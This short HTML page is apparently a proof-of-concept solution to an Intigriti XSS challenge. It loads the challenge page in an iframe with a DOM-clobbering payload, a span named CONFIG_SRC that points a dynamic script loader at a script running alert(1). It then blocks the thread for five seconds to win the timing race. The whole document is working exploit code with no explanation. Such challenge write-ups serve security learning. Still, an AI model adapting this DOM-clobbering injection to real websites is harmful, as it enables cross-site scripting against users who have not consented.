<html>
<body>
<iframe id="content"></iframe>

<script>
function loadIframe() {
    const payload = encodeURIComponent('<span id="CONFIG_SRC" data-url="/message?name=alert(1)"></span>');
    const url = `https://challenge-0525.intigriti.io/index.html?name=${payload}`;
    document.getElementById('content').src = url;
}

loadIframe();

// Block main thread to ensure DOM Clobbering happens before addDynamicScript
const start = Date.now();
while (Date.now() - start < 5000) {}
</script>
</body>
</html>
